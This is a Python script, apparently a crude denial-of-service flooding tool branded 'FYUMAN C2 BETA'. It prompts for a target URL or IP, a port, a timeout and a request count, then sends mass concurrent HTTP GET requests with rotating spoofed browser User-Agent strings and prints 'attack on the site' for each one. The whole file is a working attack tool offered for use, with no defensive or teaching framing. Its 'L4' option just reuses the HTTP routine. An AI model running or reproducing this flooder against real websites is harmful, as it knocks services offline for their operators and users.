print("𝖥𝖸𝖴𝖬𝖠𝖭 𝖢𝟤 𝖡𝖤𝖳𝖠")
import asyncio
print("𝖥𝖸𝖴𝖬𝖠𝖭 𝖢𝟤 𝖡𝖤𝖳𝖠")
print("𝖥𝖸𝖴𝖬𝖠𝖭 𝖢𝟤 𝖡𝖤𝖳𝖠")
print("𝖥𝖸𝖴𝖬𝖠𝖭 𝖢𝟤 𝖡𝖤𝖳𝖠")
print("𝖥𝖸𝖴𝖬𝖠𝖭 𝖢𝟤 𝖡𝖤𝖳𝖠")
print("𝖥𝖸𝖴𝖬𝖠𝖭 𝖢𝟤 𝖡𝖤𝖳𝖠")
import aiohttp
print("𝖥𝖸𝖴𝖬𝖠𝖭 𝖢𝟤 𝖡𝖤𝖳𝖠")
import random
print("𝖥𝖸𝖴𝖬𝖠𝖭 𝖢𝟤 𝖡𝖤𝖳𝖠")
print("𝖥𝖸𝖴𝖬𝖠𝖭 𝖢𝟤 𝖡𝖤𝖳𝖠")
print("𝖥𝖸𝖴𝖬𝖠𝖭 𝖢𝟤 𝖡𝖤𝖳𝖠")
print("𝖥𝖸𝖴𝖬𝖠𝖭 𝖢𝟤 𝖡𝖤𝖳𝖠")
print("𝖥𝖸𝖴𝖬𝖠𝖭 𝖢𝟤 𝖡𝖤𝖳𝖠")
print("𝖥𝖸𝖴𝖬𝖠𝖭 𝖢𝟤 𝖡𝖤𝖳𝖠")

async def send_requests(url, port, time, num_requests):
    async with aiohttp.ClientSession() as session:
        tasks = []
        counter = 0
        for _ in range(num_requests):
            headers = {'User-Agent': generate_user_agent()}
            task = session.get(f"{url}:{port}", headers=headers, timeout=time)
            tasks.append(task)
            counter += 1
            print(f"attack on the site {counter}")
        await asyncio.gather(*tasks)
        print(f"req {counter} attack")

def generate_user_agent():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.69 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
        'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
        'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9'
    ]
    return random.choice(user_agents)

choice = input("METHOD (1 - L7, 2 - L4): ")
if choice == "1":
    url = input("URL: ")
elif choice == "2":
    ip = input("send ip: ")
else:
    print("error")

port = input("PORT: ")
time = int(input("time attack: "))
num_requests = int(input("number of requests: "))

loop = asyncio.get_event_loop()
if choice == "1":
    loop.run_until_complete(send_requests(url, port, time, num_requests))
elif choice == "2":
    loop.run_until_complete(send_requests(ip, port, time, num_requests))
else:
    print("Неправильный выбор метода отправки запросов")